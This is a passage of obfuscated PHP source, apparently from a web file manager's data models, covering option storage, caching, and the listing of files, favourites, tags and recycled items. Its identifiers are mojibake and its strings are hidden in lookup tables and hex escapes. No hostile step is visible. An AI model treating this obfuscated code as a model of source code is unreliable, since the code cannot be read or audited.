return array_sort_by($–ş®”ÜÈ, $ÙäÌü‘İ, $çì¥´ŠÔ); } return $–ş®”ÜÈ[$_SERVER[¢ñàß¿€][472] . $’‘ñÇÆ]; } public function insert($ßâéü½û) { $î†Ïø»ê =& $_SERVER[¢ñàß¿€]; $ßâéü½û = array_field_key($ßâéü½û, $this->field); $®™ñí´ = Model($this->modelType)->get($î†Ïø»ê[473], $this->optionType . $î†Ïø»ê[474]); $®™ñí´ = $®™ñí´ ? $®™ñí´ : 0; $ßâéü½û[$î†Ïø»ê[475]] = ++$®™ñí´; $ßâéü½û[$î†Ïø»ê[231]] = time(); $ßâéü½û[$î†Ïø»ê[88]] = time(); Model($this->modelType)->set($î†Ïø»ê[473], $®™ñí´, $this->optionType . $î†Ïø»ê[474]); Model($this->modelType)->set($î†Ïø»ê[472] . $®™ñí´, $ßâéü½û, $this->optionType); return $®™ñí´; } public function update($‚âõ¡‡½, $ìÚÃ“ğá) { $½áøëí” =& $_SERVER[¢ñàß¿€]; $ìÚÃ“ğá = array_field_key($ìÚÃ“ğá, $this->field); $›‘æÎ = $this->listData($‚âõ¡‡½); if (!$›‘æÎ || !$‚âõ¡‡½) { return !1; } $ìÚÃ“ğá = array_merge($›‘æÎ, $ìÚÃ“ğá); $ìÚÃ“ğá[$½áøëí”[88]] = time(); return Model($this->modelType)->set($½áøëí”[472] . $‚âõ¡‡½, $ìÚÃ“ğá, $this->optionType); } public function remove($¦®« Õî) { if (!$¦®« Õî) { return !1; } return Model($this->modelType)->remove($_SERVER[¢ñàß¿€][472] . $¦®« Õî, $this->optionType); } public function clear() { $è–‹â =& $_SERVER[¢ñàß¿€]; Model($this->modelType)->remove($è–‹â[473], $this->optionType . $è–‹â[474]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($­äÉßş, $şÀºíËè) { if (!$şÀºíËè) { return !1; } $Èå€Ö« = $this->listData(); $Èå€Ö« = array_to_keyvalue($Èå€Ö«, $­äÉßş); return isset($Èå€Ö«[$şÀºíËè]) ? $Èå€Ö«[$şÀºíËè] : !1; } public function findByName($†¨‹æñ) { return $this->findByKey($_SERVER[¢ñàß¿€][32], $†¨‹æñ); } protected function resetData($ıôÇÜÎ) { $´¦¡Š’€ =& $_SERVER[¢ñàß¿€]; $ıôÇÜÎ = is_array($ıôÇÜÎ) ? $ıôÇÜÎ : array(); $Ë áëŞ‘ = array(); for ($…Œ¯…Îç = 0; $…Œ¯…Îç < count($ıôÇÜÎ); $…Œ¯…Îç++) { $Ë áëŞ‘[$´¦¡Š’€[472] . $ıôÇÜÎ[$…Œ¯…Îç][$´¦¡Š’€[475]]] = $ıôÇÜÎ[$…Œ¯…Îç]; } return Model($this->modelType)->set($Ë áëŞ‘, !1, $this->optionType); } private function getAutoName($‘İÏ…») { $Ğ¬ÏŞœ« = array_to_keyvalue($this->listData(), $_SERVER[¢ñàß¿€][32]); if (!$Ğ¬ÏŞœ« || !isset($Ğ¬ÏŞœ«[$‘İÏ…»])) { return $‘İÏ…»; } for ($ËËë£š = 1; $ËËë£š < count($Ğ¬ÏŞœ«); $ËËë£š++) { $á„ô–ŸØ = $‘İÏ…» . "\x28{$ËËë£š}\x29"; if (!isset($Ğ¬ÏŞœ«[$á„ô–ŸØ])) { return $á„ô–ŸØ; } } return $á„ô–ŸØ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($™üÆ­Õ = false, $şåÙÌãö = '', $Ğé¨ú†­ = false) { $œÒßËº¬ =& $_SERVER[¢ñàß¿€]; $àÒ¸Ëì· = $this->cacheGet($şåÙÌãö); $ˆäù­ì = $this->optionDefault($şåÙÌãö); $ˆäù­ì = is_array($ˆäù­ì) ? $ˆäù­ì : array(); if (is_array($àÒ¸Ëì·)) { $àÒ¸Ëì· = array_merge($ˆäù­ì, $àÒ¸Ëì·); return $™üÆ­Õ ? isset($àÒ¸Ëì·[$™üÆ­Õ]) ? $àÒ¸Ëì·[$™üÆ­Õ] : null : $àÒ¸Ëì·; } $×©ÙÉ« = $this->filterWhere(array($œÒßËº¬[33] => $şåÙÌãö)); $àÒ¸Ëì· = $this->where($×©ÙÉ«)->select(); $àÒ¸Ëì· = array_to_keyvalue($àÒ¸Ëì·, $œÒßËº¬[97], $œÒßËº¬[450]); foreach ($àÒ¸Ëì· as $ƒ¼ÄİÚ³ => $ì’Ñá÷ß) { if ($Ğé¨ú†­ || in_array($ƒ¼ÄİÚ³, $this->jsonField)) { $àÒ¸Ëì·[$ƒ¼ÄİÚ³] = json_decode($ì’Ñá÷ß, !0); } } $this->cacheSet($şåÙÌãö, $àÒ¸Ëì·); $àÒ¸Ëì· = array_merge($ˆäù­ì, $àÒ¸Ëì·); return $™üÆ­Õ ? $àÒ¸Ëì·[$™üÆ­Õ] : $àÒ¸Ëì·; } public function set($ø¹”Ò˜, $¦’ãÍÑ¶ = false, $¿è¯˜Òº = '') { $œëŒ«®Ğ =& $_SERVER[¢ñàß¿€]; $this->cacheRemove($¿è¯˜Òº); $šéôÏÇ = array(); $í¯ç¸„ª = is_array($ø¹”Ò˜) ? $ø¹”Ò˜ : array($ø¹”Ò˜ => $¦’ãÍÑ¶); foreach ($í¯ç¸„ª as $ÔƒçÓØ× => $£÷å¨¯·) { if (is_array($£÷å¨¯·)) { $£÷å¨¯· = json_encode_force($£÷å¨¯·); } $this->checkLength($£÷å¨¯·, !1, $this->tableName . $œëŒ«®Ğ[4] . $ø¹”Ò˜); $£÷å¨¯· = self::textEncode($£÷å¨¯·); $í¯ç¸„ª = array($œëŒ«®Ğ[33] => $¿è¯˜Òº, $œëŒ«®Ğ[97] => $ÔƒçÓØ×, $œëŒ«®Ğ[450] => $£÷å¨¯·); $šéôÏÇ[] = $this->filterWhere($í¯ç¸„ª); } if (!$šéôÏÇ) { return !0; } $²´âÜâ = $this->cacheKey($œëŒ«®Ğ[476]); CacheLock::lock($²´âÜâ); $“îĞÔÑş = $this->addAll($šéôÏÇ, array(), !0); CacheLock::unlock($²´âÜâ); return $“îĞÔÑş; } protected function optionDefault($É¬òÅ° = '') { return !1; } public function setDeep($’µÕšù±, $›æà±ÀÃ = false, $ÑàÙ ˆ± = '') { $ÈåŒË‘ = explode($_SERVER[¢ñàß¿€][10], $’µÕšù±); $ë–•š» = $this->get(); array_set_value($ë–•š», $’µÕšù±, $›æà±ÀÃ); $this->set($ÈåŒË‘[0], $ë–•š»[$ÈåŒË‘[0]], $ÑàÙ ˆ±); } public function remove($İæ°÷Ğ, $¦…ğÊİ‰ = '') { $ß °êÓ” =& $_SERVER[¢ñàß¿€]; $this->cacheRemove($¦…ğÊİ‰); $§±ÒòÏ» = $this->filterWhere(array($ß °êÓ”[97] => $İæ°÷Ğ, $ß °êÓ”[33] => $¦…ğÊİ‰)); if (is_null($İæ°÷Ğ)) { unset($§±ÒòÏ»[$ß °êÓ”[97]]); } return $this->where($§±ÒòÏ»)->delete(); } public function cacheSet($ØŒÅ·Ùë, $œÏèÕÓ… = false) { return Cache::set($this->cacheKey($ØŒÅ·Ùë), $œÏèÕÓ…); } public function cacheGet($Ó«­»ªç) { return Cache::get($this->cacheKey($Ó«­»ªç)); } public function cacheRemove($« Âò€) { return Cache::remove($this->cacheKey($« Âò€)); } protected function filterWhere($‘½Å’ô) { return $‘½Å’ô; } protected function cacheKey($ªîóíõ«) { return $ªîóíõ«; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\165\162\x63\145"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\x4e\141\x6d\x65" => "\x69\157\x5f\x73\x6f\x75\x72\143\145\x5f\x6d\x65\x74\141", "\x6d\x65\x74\141\x46\x69\145\x6c\144" => "\163\157\x75\162\143\145\x49\x44"); protected $dataAuto = array(array("\155\157\x64\151\146\171\124\x69\155\145", "\x74\151\155\145", "\x69\156\x73\x65\162\164", "\146\x75\x6e\x63\164\151\x6f\156"), array("\143\x72\145\141\x74\x65\124\x69\155\145", "\x74\151\x6d\145", "\x69\156\163\x65\162\164", "\x66\165\156\143\x74\x69\157\x6e"), array("\x76\151\145\167\x54\x69\155\145", "\x74\151\x6d\x65", "\x69\156\163\x65\162\x74", "\146\x75\x6e\143\164\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Œûàïå¥) { return $this->listSource(array($_SERVER[¢ñàß¿€][477] => $Œûàïå¥)); } public function typeName($¥ÏÈà¿é) { static $†ÒãÊğ´ = array(self::TYPE_SYSTEM => "\x73\171\x73\x74\x65\x6d", self::TYPE_USER => "\x75\163\145\162", self::TYPE_GROUP => "\x67\162\157\x75\x70"); return $†ÒãÊğ´[$¥ÏÈà¿é . $_SERVER[¢ñàß¿€][12]]; } public function sourceListInfo($½œé¤¬ü, $™Ì†…ó = false) { $€Ù½Íº° =& $_SERVER[¢ñàß¿€]; $½œé¤¬ü = $½œé¤¬ü ? $½œé¤¬ü : array(); $½œé¤¬ü = array_filter(array_unique($½œé¤¬ü)); if (!$½œé¤¬ü) { return array(); } $¢£ÁÛÍå = $this->where(array($€Ù½Íº°[193] => array($€Ù½Íº°[7], $½œé¤¬ü)))->select(); $this->_listDataApply($¢£ÁÛÍå, $™Ì†…ó); return array_to_keyvalue($¢£ÁÛÍå, $€Ù½Íº°[193]); } public function pathInfoFilter(&$‚¾ÑÄà) { $ÄñÙµäÕ =& $_SERVER[¢ñàß¿€]; static $ğÎßóóÖ = false; static $šùæ±õ = false; static $¨Ô€³ˆÃ = false; if (!$ğÎßóóÖ) { $²ªá…„• = $ÄñÙµäÕ[478]; $²ªá…„• .= $ÄñÙµäÕ[479]; $²ªá…„• .= $ÄñÙµäÕ[480]; $÷Ø™ÌØë = $ÄñÙµäÕ[481]; $á®Ë¾Í = explode($ÄñÙµäÕ[50], $÷Ø™ÌØë); $ğÎßóóÖ = explode($ÄñÙµäÕ[50], $²ªá…„•); $šùæ±õ = array(); foreach ($ğÎßóóÖ as $çÓÛ‚¤) { if (in_array($çÓÛ‚¤, $á®Ë¾Í)) { continue; } $šùæ±õ[] = $çÓÛ‚¤; } $¨Ô€³ˆÃ = explode($ÄñÙµäÕ[50], $ÄñÙµäÕ[482]); } foreach ($¨Ô€³ˆÃ as $©–¦ôÃğ) { if (isset($‚¾ÑÄà[$©–¦ôÃğ])) { $‚¾ÑÄà[$©–¦ôÃğ] = intval($‚¾ÑÄà[$©–¦ôÃğ]); } } $‚¾ÑÄà[$ÄñÙµäÕ[87]] = $ÄñÙµäÕ[483] . $‚¾ÑÄà[$ÄñÙµäÕ[193]] . $ÄñÙµäÕ[484]; $‚¾ÑÄà[$ÄñÙµäÕ[33]] = $‚¾ÑÄà[$ÄñÙµäÕ[485]] == 1 ? $ÄñÙµäÕ[78] : $ÄñÙµäÕ[230]; $‚¾ÑÄà[$ÄñÙµäÕ[190]] = $this->typeName($‚¾ÑÄà[$ÄñÙµäÕ[190]]); if ($‚¾ÑÄà[$ÄñÙµäÕ[485]] != 1) { $‚¾ÑÄà[$ÄñÙµäÕ[169]] = $‚¾ÑÄà[$ÄñÙµäÕ[486]]; unset($‚¾ÑÄà[$ÄñÙµäÕ[486]]); } $øÌèóİ­ = $ğÎßóóÖ; if (isset($‚¾ÑÄà[$ÄñÙµäÕ[487]]) && $‚¾ÑÄà[$ÄñÙµäÕ[487]][$ÄñÙµäÕ[488]] == -1) { $øÌèóİ­ = $šùæ±õ; } $‚¾ÑÄà = array_field_key($‚¾ÑÄà, $øÌèóİ­); return $‚¾ÑÄà; } public function listUserFav() { $ëÎå²¬¼ =& $_SERVER[¢ñàß¿€]; $¦»ş‰Ğ¬ = Model($ëÎå²¬¼[489])->listData(); $‹³ãØí¤ = array_filter_by_field($¦»ş‰Ğ¬, $ëÎå²¬¼[33], $ëÎå²¬¼[490]); $‹³ãØí¤ = array_to_keyvalue($‹³ãØí¤, $ëÎå²¬¼[12], $ëÎå²¬¼[87]); if ($‹³ãØí¤) { $›çµ¼Â® = $this->listSource(array($ëÎå²¬¼[491] => array($ëÎå²¬¼[492], $‹³ãØí¤))); } $›çµ¼Â® = array_to_keyvalue($›çµ¼Â®[$ëÎå²¬¼[445]], $ëÎå²¬¼[193]); foreach ($¦»ş‰Ğ¬ as &$Ü´“ÛêÎ) { $Ü´“ÛêÎ = array($ëÎå²¬¼[493] => $Ü´“ÛêÎ[$ëÎå²¬¼[475]], $ëÎå²¬¼[494] => $Ü´“ÛêÎ[$ëÎå²¬¼[32]], $ëÎå²¬¼[495] => $Ü´“ÛêÎ[$ëÎå²¬¼[87]], $ëÎå²¬¼[496] => $Ü´“ÛêÎ[$ëÎå²¬¼[33]], $ëÎå²¬¼[497] => $Ü´“ÛêÎ[$ëÎå²¬¼[231]], $ëÎå²¬¼[498] => $Ü´“ÛêÎ[$ëÎå²¬¼[88]]); if ($Ü´“ÛêÎ[$ëÎå²¬¼[33]] == $ëÎå²¬¼[490] && $›çµ¼Â®[$Ü´“ÛêÎ[$ëÎå²¬¼[87]]]) { $Ü´“ÛêÎ[$ëÎå²¬¼[90]] = $›çµ¼Â®[$Ü´“ÛêÎ[$ëÎå²¬¼[87]]]; } } unset($Ü´“ÛêÎ); return $¦»ş‰Ğ¬; } public function listUserTag($ôçßŠ¤) { $ôãÏÏ† =& $_SERVER[¢ñàß¿€]; if ($ôçßŠ¤ && !is_array($ôçßŠ¤)) { $ôçßŠ¤ = array($ôçßŠ¤); } $³ı˜§ = Model($ôãÏÏ†[499])->listData(); $½ÔŸ½õ = array(); $ØÂ…óŸ = array(); foreach ($³ı˜§ as $İ¤Ãëåó) { $ü•ïğä¿ = $İ¤Ãëåó[$ôãÏÏ†[87]]; if (!$ü•ïğä¿) { continue; } if (!isset($ØÂ…óŸ[$ü•ïğä¿])) { $ØÂ…óŸ[$ü•ïğä¿] = array(); } $ØÂ…óŸ[$ü•ïğä¿][] = $İ¤Ãëåó[$ôãÏÏ†[500]]; $½ÔŸ½õ[$İ¤Ãëåó[$ôãÏÏ†[87]]] = $İ¤Ãëåó; } $‡´½€²Ê = array(); $„Ñô¥”Â = array(); $úãŸÈ¯‚ = array(); foreach ($ØÂ…óŸ as $’şïÛ³ => $³ÒÅ²) { $ÚµÉÆğ¤ = !0; if (!$ôçßŠ¤) { $‡´½€²Ê[] = $’şïÛ³; continue; } foreach ($ôçßŠ¤ as $À•âÀÈ) { if (!in_array($À•âÀÈ, $³ÒÅ²)) { $ÚµÉÆğ¤ = !1; break; } } if (!$ÚµÉÆğ¤) { continue; } if (!is_numeric($’şïÛ³)) { $´Œ«±Ù† = $½ÔŸ½õ[$’şïÛ³]; $ŞœÔãøü = array($ôãÏÏ†[32] => $´Œ«±Ù†[$ôãÏÏ†[32]], $ôãÏÏ†[87] => $´Œ«±Ù†[$ôãÏÏ†[87]], $ôãÏÏ†[33] => $´Œ«±Ù†[$ôãÏÏ†[33]], $ôãÏÏ†[90] => array($ôãÏÏ†[501] => 1), $ôãÏÏ†[232] => !0); if ($´Œ«±Ù†[$ôãÏÏ†[33]] == $ôãÏÏ†[230]) { $úãŸÈ¯‚[] = $ŞœÔãøü; } if ($´Œ«±Ù†[$ôãÏÏ†[33]] == $ôãÏÏ†[78]) { $„Ñô¥”Â[] = $ŞœÔãøü; } continue; } $‡´½€²Ê[] = $’şïÛ³; } if ($‡´½€²Ê) { $¬ùÖá’ = $this->listSource(array($ôãÏÏ†[491] => array($ôãÏÏ†[492], $‡´½€²Ê))); } $¬ùÖá’ = $¬ùÖá’ ? $¬ùÖá’ : array($ôãÏÏ†[85] => array(), $ôãÏÏ†[86] => array()); $¬ùÖá’[$ôãÏÏ†[85]] = array_merge($¬ùÖá’[$ôãÏÏ†[85]], $„Ñô¥”Â); $¬ùÖá’[$ôãÏÏ†[86]] = array_merge($¬ùÖá’[$ôãÏÏ†[86]], $úãŸÈ¯‚); if (isset($¬ùÖá’[$ôãÏÏ†[442]]) && count($‡´½€²Ê) == $¬ùÖá’[$ôãÏÏ†[442]][$ôãÏÏ†[443]]) { return $¬ùÖá’; } $—ê´©ò = array(); $õ´ËöÔõ = array_to_keyvalue($¬ùÖá’[$ôãÏÏ†[85]], $ôãÏÏ†[12], $ôãÏÏ†[193]); $ÒˆûìÚƒ = array_to_keyvalue($¬ùÖá’[$ôãÏÏ†[86]], $ôãÏÏ†[12], $ôãÏÏ†[193]); $íªôÌ›Ù = array_merge($ÒˆûìÚƒ, $õ´ËöÔõ); foreach ($‡´½€²Ê as $ü•ïğä¿) { if (!in_array($ü•ïğä¿, $íªôÌ›Ù)) { $—ê´©ò[] = $ü•ïğä¿; } } if ($—ê´©ò) { Model($ôãÏÏ†[502])->removeBySource($—ê´©ò); } return $¬ùÖá’; } public function listUserRecycle() { $ÉïêøÁ =& $_SERVER[¢ñàß¿€]; $Ú»ëÅú = Model($ÉïêøÁ[503])->listData(); if (!$Ú»ëÅú) { return array(); } $Ù¡‚øá = array($ÉïêøÁ[491] => array($ÉïêøÁ[492], $Ú»ëÅú), $ÉïêøÁ[504] => 1); return $this->listSource($Ù¡‚øá); } public function listSource($½Å¾¼Ûè, $àëùÌÚÁ = 3000, $æ…×Ş¨± = false) { $Ê°Å—°æ =& $_SERVER[¢ñàß¿€]; if (!isset($½Å¾¼Ûè[$Ê°Å—°æ[505]])) { $½Å¾¼Ûè[$Ê°Å—°æ[505]] = 0; } if (isset($½Å¾¼Ûè[$Ê°Å—°æ[192]]) && $½Å¾¼Ûè[$Ê°Å—°æ[192]] == $Ê°Å—°æ[228]) { $½Å¾¼Ûè[$Ê°Å—°æ[486]] = array($Ê°Å—°æ[407], $Ê°Å—°æ[506]); } $£ÊöÆøè = $Ê°Å—°æ[507]; $×é°Ï©¶ = $this->field($£ÊöÆøè)->_makeOrder()->where($½Å¾¼Ûè)->selectPage($àëùÌÚÁ); $this->_listPageCheck($×é°Ï©¶, $£ÊöÆøè, $½Å¾¼Ûè); $this->_listDataApply($×é°Ï©¶[$Ê°Å—°æ[445]], $æ…×Ş¨±); $this->_listMake($×é°Ï©¶); return $×é°Ï©¶; } private function _listPageCheck(&$Ñ†…ãÎ», $í‘·èĞ·, $Ş¡€¿) { $ããË³ËÛ =& $_SERVER[¢ñàß¿€]; if (!is_array($Ñ†…ãÎ»[$ããË³ËÛ[442]])) { return; } $î¡³œú’ = $Ñ†…ãÎ»[$ããË³ËÛ[442]]; if ($î¡³œú’[$ããË³ËÛ[444]] <= 1) { return; } if ($î¡³œú’[$ããË³ËÛ[443]] >= 100000) { return; } if (Model($ããË³ËÛ[508])->get($ããË³ËÛ[509]) != $ããË³ËÛ[510]) { return; } $í‘·èĞ· = str_replace(array($ããË³ËÛ[53], $ããË³ËÛ[418], $ããË³ËÛ[262]), $ããË³ËÛ[12], $í‘·èĞ·); $í‘·èĞ· = $ããË³ËÛ[511] . str_replace($ããË³ËÛ[50], $ããË³ËÛ[512], $í‘·èĞ·) . $ããË³ËÛ[513]; $×¶Ã³‡ = $ããË³ËÛ[514]; $×¶Ã³‡ = $×¶Ã³‡ . $ããË³ËÛ[515]; $ãâ¡ƒöí = $î¡³œú’[$ããË³ËÛ[439]] * ($î¡³œú’[$ããË³ËÛ[429]] - 1) . $ããË³ËÛ[50] . $î¡³œú’[$ããË³ËÛ[439]]; $ÄéÎ®”À = $this->_makeOrder(!0); $ŸÀÁâ°î = $ããË³ËÛ[511] . str_replace($ããË³ËÛ[50], $ããË³ËÛ[512], $ÄéÎ®”À[0]); if (strpos($ŸÀÁâ°î, $ããË³ËÛ[516])) { $ŸÀÁâ°î = str_replace($ããË³ËÛ[516], $ããË³ËÛ[517], $ŸÀÁâ°î); } else { $ŸÀÁâ°î .= $ããË³ËÛ[518] . $ÄéÎ®”À[1]; } $™óş¢œ = array(); foreach ($Ş¡€¿ as $¨Ù°ĞÎÊ => $¤ÌÕÆ¶Õ) { $™óş¢œ[$ããË³ËÛ[511] . $¨Ù°ĞÎÊ] = $¤ÌÕÆ¶Õ; } $this->alias($ããË³ËÛ[519])->field($í‘·èĞ·)->limit($ãâ¡ƒöí)->order($ŸÀÁâ°î); $’¨åÚ = $this->join($×¶Ã³‡)->where($™óş¢œ)->select(); if ($’¨åÚ) { $Ñ†…ãÎ»[$ããË³ËÛ[445]] = $’¨åÚ; } } protected function _makeOrder($–ê¡Ÿ™ = false) { $ÔÆó³©› =& $_SERVER[¢ñàß¿€]; $ìÅµÒ¨Í = Model($ÔÆó³©›[520])->get($ÔÆó³©›[521]); $ãúÓ¹Ê = Model($ÔÆó³©›[520])->get($ÔÆó³©›[522]); $ÚÎŸ‚Ï = array($ÔÆó³©›[523] => $ÔÆó³©›[524], $ÔÆó³©›[525] => $ÔÆó³©›[526]); $¹üàÈ¥¢ = array($ÔÆó³©›[32] => $ÔÆó³©›[32], $ÔÆó³©›[79] => $ÔÆó³©›[79], $ÔÆó³©›[169] => $ÔÆó³©›[486], $ÔÆó³©›[527] => $ÔÆó³©›[527], $ÔÆó³©›[528] => $ÔÆó³©›[529], $ÔÆó³©›[231] => $ÔÆó³©›[231], $ÔÆó³©›[88] => $ÔÆó³©›[88]); $»ÛóæÏÜ = Input::get($ÔÆó³©›[530], $ÔÆó³©›[7], $ìÅµÒ¨Í, array_keys($¹üàÈ¥¢)); $ë”ÚŞêá = Input::get($ÔÆó³©›[531], $ÔÆó³©›[7], $ãúÓ¹Ê, array_keys($ÚÎŸ‚Ï)); if (!in_array($»ÛóæÏÜ, array_keys($¹üàÈ¥¢))) { $»ÛóæÏÜ = $ÔÆó³©›[32]; } if (!in_array($ë”ÚŞêá, array_keys($ÚÎŸ‚Ï))) { $»ÛóæÏÜ = $ÔÆó³©›[523]; } if ($»ÛóæÏÜ == $ÔÆó³©›[32]) { } $¢©ùõ™Ñ = $ÔÆó³©›[532] . $¹üàÈ¥¢[$»ÛóæÏÜ] . $ÔÆó³©›[53] . $ÚÎŸ‚Ï[$ë”ÚŞêá]; $¢©ùõ™Ñ = rtrim(trim($¢©ùõ™Ñ), $ÔÆó³©›[50]); if ($–ê¡Ÿ™) { return array($¢©ùõ™Ñ, $ÚÎŸ‚Ï[$ë”ÚŞêá]); } return $this->order($¢©ùõ™Ñ); } protected function _listDataApplyItem($”ûâ‹Ú·, $—óø¬©« = false) { $¼õš”‘® = array($”ûâ‹Ú·); $this->_listDataApply($¼õš”‘®, $—óø¬©«); return $¼õš”‘®[0]; } protected function _listDataApply(&$“›¹ š, $›ª§ğÌ« = false) { $îé©é²¦ =& $_SERVER[¢ñàß¿€]; if (!$“›¹ š) { $“›¹ š = array(); return; } $ğßüĞµ = array_to_keyvalue($“›¹ š, $îé©é²¦[12], $îé©é²¦[193]); $ğßüĞµ = array_unique($ğßüĞµ); $this->_listSourceCache($“›¹ š); if (!$›ª§ğÌ«) { $this->_listAppendMeta($“›¹ š, $ğßüĞµ); $this->_listAppendFileMeta($“›¹ š, $ğßüĞµ); $this->_listAppendChildren($“›¹ š, $ğßüĞµ); } $this->_listAppendPath($“›¹ š); $this->_listAppendAuth($“›¹ š); $this->_listAppendSourceInfo($“›¹ š, $ğßüĞµ); $this->_listAppendUser($“›¹ š); $this->_listFilterInfo($“›¹ š, $›ª§ğÌ«); $this->_listAppendAuthSecret($“›¹ š); } protected function _listSourceCache($’µœ«õ) { $Ñš‡ş¬“ =& $_SERVER[¢ñàß¿€]; foreach ($’µœ«õ as $¶ù—ò÷³) { self::$cacheSourceInfo[$Ñš‡ş¬“[533] . $¶ù—ò÷³[$Ñš‡ş¬“[193]]] = $¶ù—ò÷³; } } protected function _listFilterInfo(&$šß‰¢, $ˆ©Äë“” = false) { $ÕïíŠÈ· =& $_SERVER[¢ñàß¿€]; foreach ($šß‰¢ as &$ã§½ò¾¥) { $ã§½ò¾¥ = $this->pathInfoFilter($ã§½ò¾¥); self::$cachePathInfo[$ÕïíŠÈ·[534] . intval($ˆ©Äë“”) . $ÕïíŠÈ·[462] . $ã§½ò¾¥[$ÕïíŠÈ·[193]]] = $ã§½ò¾¥; } unset($ã§½ò¾¥); } protected function _listMake(&$öÄøàó”) { $ãÖüæ =& $_SERVER[¢ñàß¿€]; $öÄøàó”[$ãÖüæ[85]] = array(); $öÄøàó”[$ãÖüæ[86]] = array(); foreach ($öÄøàó”[$ãÖüæ[445]] as $â«¦ÂÀ) { $›¯®†ãœ = $â«¦ÂÀ[$ãÖüæ[485]] == 1 ? $ãÖüæ[85] : $ãÖüæ[86]; $öÄøàó”[$›¯®†ãœ][] = $â«¦ÂÀ; } unset($öÄøàó”[$ãÖüæ[445]]); } protected function _listAppendMeta(&$–Ü˜Øã, $ÌŠ†ÎÅñ) { $—üù€¹ =& $_SERVER[¢ñàß¿€]; $ĞìÌùÕ¾ = array($—üù€¹[491] => array($—üù€¹[492], $ÌŠ†ÎÅñ)); $â‡âğ = Model($—üù€¹[535])->field($—üù€¹[536])->where($ĞìÌùÕ¾)->select(); if (!$â‡âğ) { return; } $—ççğ = array($—üù€¹[537], $—üù€¹[538], $—üù€¹[517]); $½»Üï¿ = array(); foreach ($â‡âğ as $†Å–¶°ú) { if (!isset($½»Üï¿[$†Å–¶°ú[$—üù€¹[193]]])) { $½»Üï¿[$†Å–¶°ú[$—üù€¹[193]]] = array(); } if (in_array($†Å–¶°ú[$—üù€¹[97]], $—ççğ)) { continue; } $½»Üï¿[$†Å–¶°ú[$—üù€¹[193]]][$†Å–¶°ú[$—üù€¹[97]]] = $†Å–¶°ú[$—üù€¹[450]]; } foreach ($–Ü˜Øã as &$ÆÅÁÃ÷) { $ÆÅÁÃ÷[$—üù€¹[539]] = !1; if (isset($½»Üï¿[$ÆÅÁÃ÷[$—üù€¹[193]]])) { $ÆÅÁÃ÷[$—üù€¹[539]] = $½»Üï¿[$ÆÅÁÃ÷[$—üù€¹[193]]]; } if ($this->fileIsLock($ÆÅÁÃ÷) && $ÆÅÁÃ÷[$—üù€¹[487]]) { $áï¦œšâ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ÆÅÁÃ÷[$—üù€¹[487]][$—üù€¹[488]] = AuthModel::authDisable($ÆÅÁÃ÷[$—üù€¹[487]][$—üù€¹[488]], $áï¦œšâ); $ÆÅÁÃ÷[$—üù€¹[487]][$—üù€¹[540]][$—üù€¹[487]] = $ÆÅÁÃ÷[$—üù€¹[487]][$—üù€¹[488]]; } } unset($ÆÅÁÃ÷); } protected function _listAppendFileMeta(&$’û‹¿Í, $ò×Äøà ) { $…µŒÅ” =& $_SERVER[¢ñàß¿€]; $šåİÒÂ– = array_to_keyvalue($’û‹¿Í, $…µŒÅ”[12], $…µŒÅ”[541]); $šåİÒÂ– = array_filter(array_unique($šåİÒÂ–)); if (!$šåİÒÂ–) { return; } $îšå©¨³ = array($…µŒÅ”[542] => array($…µŒÅ”[492], $šåİÒÂ–)); $æÕ•âÇ¨ = $…µŒÅ”[543]; $ëî™ãçè = Model($…µŒÅ”[544])->field($æÕ•âÇ¨)->where($îšå©¨³)->select(); $ëî™ãçè = array_to_keyvalue($ëî™ãçè, $…µŒÅ”[541]); $û¶ïòÓ¬ = Model($…µŒÅ”[545])->field($…µŒÅ”[546])->where($îšå©¨³)->select(); $û¶ïòÓ¬ = $û¶ïòÓ¬ ? $û¶ïòÓ¬ : array(); $¦Ò‚Ê¶ = array(); foreach ($û¶ïòÓ¬ as $İÅ·Ó³ğ) { if (!isset($¦Ò‚Ê¶[$İÅ·Ó³ğ[$…µŒÅ”[541]]])) { $¦Ò‚Ê¶[$İÅ·Ó³ğ[$…µŒÅ”[541]]] = array(); } $¦Ò‚Ê¶[$İÅ·Ó³ğ[$…µŒÅ”[541]]][$İÅ·Ó³ğ[$…µŒÅ”[97]]] = $İÅ·Ó³ğ[$…µŒÅ”[450]]; } foreach ($’û‹¿Í as &$ìÙØ‰ü·) { $ŞÀë‚íó = $ìÙØ‰ü·[$…µŒÅ”[541]]; if (!$ŞÀë‚íó || !is_array($ëî™ãçè[$ŞÀë‚íó])) { continue; } $ü±Š÷Ø¢ = $ëî™ãçè[$ŞÀë‚íó]; $ü±Š÷Ø¢[$…µŒÅ”[79]] = $ìÙØ‰ü·[$…µŒÅ”[79]]; $ü±Š÷Ø¢[$…µŒÅ”[32]] = $ìÙØ‰ü·[$…µŒÅ”[32]]; if (!$ü±Š÷Ø¢[$…µŒÅ”[547]]) { Model($…µŒÅ”[544])->fileMd5Check($ü±Š÷Ø¢); } if (!isset(self::$cacheFileInfo[$…µŒÅ”[548] . $ŞÀë‚íó])) { self::$cacheFileInfo[$…µŒÅ”[548] . $ŞÀë‚íó] = array_merge(array(), $ü±Š÷Ø¢); } unset($ëî™ãçè[$ŞÀë‚íó][$…µŒÅ”[87]]); $»åê§´± = isset($¦Ò‚Ê¶[$ŞÀë‚íó]) && is_array($¦Ò‚Ê¶[$ŞÀë‚íó]) ? $¦Ò‚Ê¶[$ŞÀë‚íó] : array(); $ìÙØ‰ü·[$…µŒÅ”[170]] = array_merge($»åê§´±, $ëî™ãçè[$ŞÀë‚íó]); if (isset($ìÙØ‰ü·[$…µŒÅ”[170]][$…µŒÅ”[184]])) { $ìÙØ‰ü·[$…µŒÅ”[184]] = json_decode($ìÙØ‰ü·[$…µŒÅ”[170]][$…µŒÅ”[184]], !0); unset($ìÙØ‰ü·[$…µŒÅ”[170]][$…µŒÅ”[184]]); } } unset($ìÙØ‰ü·); } protected function _listAppendSourceInfo(&$ë¹ÈÄ¦­, $àùñÜˆ·) { $ª˜õ„ Æ =& $_SERVER[¢ñàß¿€]; $ª­ØËÙÕ = 